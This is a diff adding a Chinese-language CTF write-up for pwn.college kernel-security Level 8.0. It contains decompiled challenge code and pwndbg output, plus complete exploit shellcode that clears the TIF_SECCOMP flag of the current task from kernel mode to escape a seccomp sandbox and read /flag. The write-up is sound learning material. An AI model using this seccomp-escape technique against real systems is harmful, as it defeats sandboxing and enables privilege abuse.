@@ -1,7 +1,7 @@
 ---
 title: "Write-ups: System Security (Kernel Security) series"
 published: 2025-12-19
-updated: 2025-12-22
+updated: 2025-12-23
 description: "Write-ups for pwn.college kernel exploitation series."
 image: "https://ghproxy.net/https://raw.githubusercontent.com/CuB3y0nd/picx-images-hosting/master/.pfs8v4jqs.avif"
 tags: ["Pwn", "Write-ups", "Kernel"]
@@ -482,6 +482,236 @@ int main(void) {
   assert(ioctl(fd, REQUEST, &payload) >= 0);
   close(fd);
   system("cat /flag");
+
+  return 0;
+}
+```
+
+# Level 8.0
+
+## Information
+
+- Category: Pwn
+
+## Description
+
+> Utilize a userspace binary to interact with a kernel device.
+
+## Write-up
+
+这个 challenge 给了两个文件，一个用户态的程序，一个内核 module，话不多说，直接逆。
+
+下面是内核 module 主要逻辑，从用户态读入 shellcode 到内核态的 buf 然后执行：
+
+```c del={10-11}
+ssize_t __fastcall device_write(file *file, const char *buffer, size_t length, loff_t *offset)
+{
+  size_t n4096; // rdx
+  __int64 v6; // rbp
+
+  printk(&unk_968, file, buffer, length, offset);
+  n4096 = 4096;
+  if ( length <= 0x1000 )
+    n4096 = length;
+  v6 = copy_from_user(shellcode, buffer, n4096);
+  ((void (*)(void))shellcode)();
+  return length - v6;
+}
+```
+
+然后这个用户态程序逻辑如下：
+
+```c del={23, 43}
+int __fastcall main(int argc, const char **argv, const char **envp)
+{
+  int i; // [rsp+24h] [rbp-1Ch]
+  int v5; // [rsp+28h] [rbp-18h]
+  int v6; // [rsp+2Ch] [rbp-14h]
+  __int64 v7; // [rsp+38h] [rbp-8h]
+
+  setvbuf(stdin, 0, 2, 0);
+  setvbuf(stdout, 0, 2, 0);
+  puts("###");
+  printf("### Welcome to %s!\n", *argv);
+  puts("###");
+  putchar(10);
+  puts("You may upload custom shellcode to do whatever you want.\n");
+  puts("For extra security, this challenge will only allow certain system calls!\n");
+  v5 = open("/proc/pwncollege", 2);
+  printf("Opened `/proc/pwncollege` on fd %d.\n", v5);
+  puts(&s_);
+  if ( mmap((void *)0x31337000, 0x1000u, 7, 34, 0, 0) != (void *)825454592 )
+    __assert_fail("shellcode == (void *)0x31337000", "<stdin>", 0x63u, "main");
+  printf("Mapped 0x1000 bytes for shellcode at %p!\n", (const void *)0x31337000);
+  puts("Reading 0x1000 bytes of shellcode from stdin.\n");
+  v6 = read(0, (void *)0x31337000, 0x1000u);
+  puts("This challenge is about to execute the following shellcode:\n");
+  print_disassembly(825454592, v6);
+  puts(&s_);
+  puts("Restricting system calls (default: allow).\n");
+  v7 = seccomp_init(2147418112);
+  for ( i = 0; i <= 511; ++i )
+  {
+    if ( i == 1 )
+    {
+      printf("Allowing syscall: %s (number %i).\n", "write", 1);
+    }
+    else if ( (unsigned int)seccomp_rule_add(v7, 0, (unsigned int)i, 0) )
+    {
+      __assert_fail("seccomp_rule_add(ctx, SCMP_ACT_KILL, i, 0) == 0", "<stdin>", 0x79u, "main");
+    }
+  }
+  puts("Executing shellcode!\n");
+  if ( (unsigned int)seccomp_load(v7) )
+    __assert_fail("seccomp_load(ctx) == 0", "<stdin>", 0x7Eu, "main");
+  MEMORY[0x31337000]();
+  puts("### Goodbye!");
+  return 0;
+}
+```
+
+可以看到这个程序已经为我们打开了内核 module 创建的设备文件，然后 mmap 了一块 rwx 内存，之后从 stdin 向 mmap 出来的内存读入数据，然后通过 seccomp 白名单只放行了 `write` 调用，然后执行 mmap 出来的地址。
+
+问题就在于我们写入的 shellcode 既会在内核态执行，又会在用户态执行。虽然用户态只能调用 `write`，但我们可以先在内核态将当前进程的 seccomp 手动关闭，然后返回到用户态执行后续操作就不受限制了。
+
+先读一下内核源码，看看这个 seccomp 机制是怎么运作的。
+
+众所周知，内核中每个进程都有一个 [task_struct](https://elixir.bootlin.com/linux/v5.4/source/include/linux/sched.h#L624) 结构体，这个结构体中又有一个 [thread_info](https://elixir.bootlin.com/linux/v5.4/source/arch/x86/include/asm/thread_info.h#L56) 结构体，保存当前 thread 的信息：
+
+```c
+struct thread_info {
+  unsigned long  flags;   /* low level flags */
+  u32            status;  /* thread synchronous flags */
+};
+```
+
+`thread_info` 的 flags 字段有如下这些可用 flags，其中有一个叫做 `TIF_SECCOMP` 的东西引起了我们的注意（
+
+```c ins={9}
+#define TIF_SYSCALL_TRACE 0 /* syscall trace active */
+#define TIF_NOTIFY_RESUME 1 /* callback before returning to user */
+#define TIF_SIGPENDING  2 /* signal pending */
+#define TIF_NEED_RESCHED 3 /* rescheduling necessary */
+#define TIF_SINGLESTEP  4 /* reenable singlestep on user return*/
+#define TIF_SSBD  5 /* Speculative store bypass disable */
+#define TIF_SYSCALL_EMU  6 /* syscall emulation active */
+#define TIF_SYSCALL_AUDIT 7 /* syscall auditing active */
+#define TIF_SECCOMP  8 /* secure computing */
+#define TIF_SPEC_IB  9 /* Indirect branch speculation mitigation */
+#define TIF_SPEC_FORCE_UPDATE 10 /* Force speculation MSR update in context switch */
+#define TIF_USER_RETURN_NOTIFY 11 /* notify kernel of userspace return */
+#define TIF_UPROBE  12 /* breakpointed or singlestepping */
+#define TIF_PATCH_PENDING 13 /* pending live patching update */
+#define TIF_NEED_FPU_LOAD 14 /* load FPU on return to userspace */
+#define TIF_NOCPUID  15 /* CPUID is not accessible in userland */
+#define TIF_NOTSC  16 /* TSC is not accessible in userland */
+#define TIF_IA32  17 /* IA32 compatibility process */
+#define TIF_NOHZ  19 /* in adaptive nohz mode */
+#define TIF_MEMDIE  20 /* is terminating due to OOM killer */
+#define TIF_POLLING_NRFLAG 21 /* idle is polling for TIF_NEED_RESCHED */
+#define TIF_IO_BITMAP  22 /* uses I/O bitmap */
+#define TIF_FORCED_TF  24 /* true if TF in eflags artificially */
+#define TIF_BLOCKSTEP  25 /* set when we want DEBUGCTLMSR_BTF */
+#define TIF_LAZY_MMU_UPDATES 27 /* task is updating the mmu lazily */
+#define TIF_SYSCALL_TRACEPOINT 28 /* syscall tracepoint instrumentation */
+#define TIF_ADDR32  29 /* 32-bit address space on 64 bits */
+#define TIF_X32   30 /* 32-bit native x86-64 binary */
+#define TIF_FSCHECK  31 /* Check FS is USER_DS on return */
+```
+
+查看引用，得到如下[代码](https://elixir.bootlin.com/linux/v5.4/source/include/linux/seccomp.h#L38)：
+
+```c {5-6}
+#ifdef CONFIG_HAVE_ARCH_SECCOMP_FILTER
+extern int __secure_computing(const struct seccomp_data *sd);
+static inline int secure_computing(const struct seccomp_data *sd)
+{
+  if (unlikely(test_thread_flag(TIF_SECCOMP)))
+    return  __secure_computing(sd);
+  return 0;
+}
+#else
+extern void secure_computing_strict(int this_syscall);
+#endif
+```
+
+很显然，如果设置了 `TIF_SECCOMP` 位那就执行 [\_\_secure_computing](https://elixir.bootlin.com/linux/v5.4/source/kernel/seccomp.c#L920) 对进行的系统调用进行检查，否则啥也不干。
+
+所以我们只要通过 `current_task_struct->thread_info.flags &= ~(1 << TIF_SECCOMP)` 手动清除这个 flag 位就能关闭 seccomp，是不是很帅？
+
+非常幸运的是，`current_task_struct` 位于 `per-cpu` 数据区，而 `gs_base` 指向的就是这个数据区的基地址。我们可以通过 `p &current_task` 得到这个结构体在 `per-cpu` 数据区内的偏移：
+
+```shellsession
+pwndbg> p &current_task
+$1 = (struct task_struct **) 0x15d00 <current_task>
+pwndbg> ptype /o struct task_struct
+/* offset      |    size */  type = struct task_struct {
+/*      0      |      16 */    struct thread_info {
+/*      0      |       8 */        unsigned long flags;
+/*      8      |       4 */        u32 status;
+/* XXX  4-byte padding   */
+[...]
+pwndbg> ptype /o struct thread_info
+/* offset      |    size */  type = struct thread_info {
+/*      0      |       8 */    unsigned long flags;
+/*      8      |       4 */    u32 status;
+/* XXX  4-byte padding   */
+
+                               /* total size (bytes):   16 */
+                             }
+```
+
+## Exploit
+
+```c
+#include <unistd.h>
+
+#define PACKED __attribute__((packed))
+#define NAKED __attribute__((naked))
+
+#define STR(x) #x
+#define XSTR(x) STR(x)
+
+#define TIF_SECCOMP 8
+
+NAKED void shellcode(void) {
+  __asm__ volatile(
+      ".intel_syntax noprefix;"
+      ".global sc_start;"
+      ".global sc_end;"
+      "sc_start:;"
+      "mov rdi, 0x3;"
+      "lea rsi, [rip + break_seccomp_start];"
+      "mov rdx, break_seccomp_end - break_seccomp_start;"
+      "mov rax, 0x1;"
+      "syscall;" // write(0x3, break_seccomp_start, sizeof(break_seccomp))
+      "lea rdi, [rip + flag];"
+      "xor rsi, rsi;"
+      "mov rax, 0x2;"
+      "syscall;" // open("/flag", 0)
+      "mov rdi, 0x1;"
+      "mov rsi, rax;"
+      "xor rdx, rdx;"
+      "mov r10, 0x1337;"
+      "mov rax, 0x28;"
+      "syscall;" // sendfile(0x1, flag_fd, 0, 0x1337)
+      "break_seccomp_start:;"
+      "mov rax, QWORD PTR gs:0x15d00;"
+      "and QWORD PTR [rax], ~(1 << " XSTR(TIF_SECCOMP) ");"
+      "ret;"
+      "break_seccomp_end:;"
+      "flag: .ascii \"/flag\";"
+      "sc_end:;"
+      ".att_syntax;");
+}
+
+extern char sc_start[];
+extern char sc_end[];
+
+int main(void) {
+  size_t sc_size = sc_end - sc_start;
+
+  write(STDOUT_FILENO, sc_start, sc_size);
 
   return 0;
 }
